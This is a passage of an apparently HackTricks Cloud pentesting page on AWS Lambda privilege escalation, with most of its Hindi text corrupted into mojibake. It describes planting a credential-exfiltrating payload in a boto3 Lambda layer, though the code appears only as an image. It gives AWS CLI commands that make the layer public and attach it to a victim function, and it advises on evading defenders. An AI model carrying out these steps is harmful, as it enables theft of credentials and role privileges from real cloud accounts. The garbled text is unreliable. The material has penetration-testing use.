рд╕реБрд░рдХреНрд╖рд┐рдд рд░рд╣рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рд▓реИрдореНрдмрдбрд╛ рд░рдирдЯрд╛рдЗрдо рд╕реЗ рдмреЛрдЯреЛ3 рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЙрд╕реА рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Pip рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ (Python 3.7), рддрд╛рдХрд┐ рд▓рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╕рдорд╕реНрдпрд╛ рдХрд╛ рдХрд╛рд░рдг рдмрдирдиреЗ рд╡рд╛рд▓реА рдХреЛрдИ рднрд┐рдиреНрди рдЪреАрдЬ рди рд╣реЛред рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрд╕ рд░рдирдЯрд╛рдЗрдо рдореЗрдВ boto3 рд╕рдВрд╕реНрдХрд░рдг 1.9.42 рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде, рд╣рдо рдмреЛрдЯреЛ3 рд╕рдВрд╕реНрдХрд░рдг 1.9.42 рдФрд░ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рд╕реНрдерд╛рдиреАрдп "lambda\_layer" рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВрдЧреЗ:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
рдЕрдм, рд╣рдо `/lambda_layer/boto3/__init__.py` рдЦреЛрд▓реЗрдВрдЧреЗ рдФрд░ рдЗрд╕рдореЗрдВ рджреБрд╖реНрдЯ рдХреЛрдб рдЬреЛрдбрд╝реЗрдВрдЧреЗред рд╣рдо рдЬреЛрдбрд╝рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдкреЗрд▓реЛрдб рдЗрд╕ рддрд░рд╣ рд╕реЗ рджрд┐рдЦрддрд╛ рд╣реИ:

![](<../../../.gitbook/assets/image (26).png>)

`requests` рдХреЛ `botocore` рд╕реЗ рдЖрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдлрд╝рдВрдХреНрд╢рди env variables рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗрдЧрд╛, рдФрд░ try-except рдФрд░ 0.1 timeout рдЗрд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ рдХрд┐ рдпрд╣ рдХреЛрдб рдХреБрдЫ рднреА рди рддреЛрдбрд╝ рджреЗред

{% hint style="info" %}
**рдорд╣рддреНрд╡рдкреВрд░реНрдг рдиреЛрдЯ:** рдЖрдкрдХреЛ рдЕрдм рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдореЗрдВ `from botocore.vendored import requests` рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдХрд╛рд░рдг рдПрдХ "DeprecationWarning" рдХреНрд▓рд╛рдЙрдбрд╡реЙрдЪ рд▓реЙрдЧреНрд╕ рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рд╣реЛрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рдЖрдкрдХреЛ рдПрдХ рдмрдЪрд╛рд╡рдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛рдиреЗ рдХрд╛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрдЧрд╛ред
{% endhint %}

рдЕрдм, рдЙрд╕ рдХреЛрдб рдХреЛ рдПрдХ **ZIP рдлрд╝рд╛рдЗрд▓** рдореЗрдВ рдмрдВрдбрд▓ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ **рд╣рдорд▓рд╛рд╡рд░ рдЦрд╛рддреЗ рдореЗрдВ рдПрдХ рдирдпрд╛ Lambda layer рдкрд░ рдЕрдкрд▓реЛрдб** рдХрд░реЗрдВред рдкрд╣рд▓реЗ рдПрдХ "python" рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рд╡рд╣рд╛рдВ рдЕрдкрдиреА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ рд░рдЦрдиреА рд╣реЛрдЧреА рддрд╛рдХрд┐ рдЬрдм рд╣рдо рдЗрд╕реЗ Lambda рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдХреЛрдб " /opt/python/boto3" рдкрд░ рдорд┐рд▓ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд▓реЗрдпрд░ Python 3.7 рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд рд╣реИ рдФрд░ **рд▓реЗрдпрд░ рд╣рдорд╛рд░реЗ рд▓рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рдорд╛рди рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╣реИ**ред рдЬрдм рдпрд╣ рд╣реЛ рдЬрд╛рдП, рд╣рдо `lambda:AddLayerVersionPermission` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рддрд╛рдХрд┐ рд▓реЗрдпрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдкрд╣реБрдБрдЪрдпреЛрдЧреНрдп рд╣реЛ рдФрд░ рд╣рдорд╛рд░рд╛ рд▓рдХреНрд╖рд┐рдд рдЦрд╛рддрд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗред рдЗрд╕ API рдХреЙрд▓ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рд╡реНрдпрдХреНрддрд┐рдЧрдд AWS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
рдЕрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ **рдзреНрд╡рд╕реНрдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рд╣реИ, рд╣рдо рдЕрдкрдиреЗ рд▓рдХреНрд╖рд┐рдд Lambda function "s3-getter" рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВрдЧреЗ, рдЬреЛ рд╣рдорд╛рд░реЗ рдХреНрд░реЙрд╕-рдЕрдХрд╛рдЙрдВрдЯ Lambda рд▓реЗрдпрд░ рдХреЛ **рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдЧрд╛**ред
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реЛрдЧрд╛ рдпрд╛ рддреЛ рд╣рдо рдЦреБрдж **рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрд╣реНрд╡рд╛рди рдХрд░реЗрдВ** рдЕрдЧрд░ рд╣рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдлрд┐рд░ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ рдХрд┐ рдпрд╣ **рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ рд╕реЗ рдЖрд╣реНрд╡рд╛рдирд┐рдд рд╣реЛ рдЬрд╛рдП** - рдЬреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХрд╛ рд╣реИред

рдЗрд╕ рд╡рдВрд╢рд╛рд╡рд▓реА рдореЗрдВ рдПрдХ **рдФрд░ рдЫрд┐рдкреА рд╣реБрдИ рддрд░реАрдХрд╛** рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзреА рдкреНрд░рд╡реЗрд╢рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

рд╢рд╛рдпрдж рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ URL рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ... рд▓реЗрдХрд┐рди рдореБрдЭреЗ рдЗрд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдорд┐рд▓рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рддреЛ рдореБрдЭреЗ рдмрддрд╛рдПрдВ!

### рд▓реИрдореНрдмрдбрд╛ MitM

рдХреБрдЫ рд▓реИрдореНрдмрдбрд╛ **рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣реЗ рд╣реЛрдВрдЧреЗред** рдпрджрд┐ рдЖрдк рдЙрдирдореЗрдВ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрдирдХреЛ рдирд┐рд╖реНрдХрд░реНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдиреНрд╣реЗрдВ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рдЗрд╕реЗ рдЬрд╛рдВрдЪреЗрдВ:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
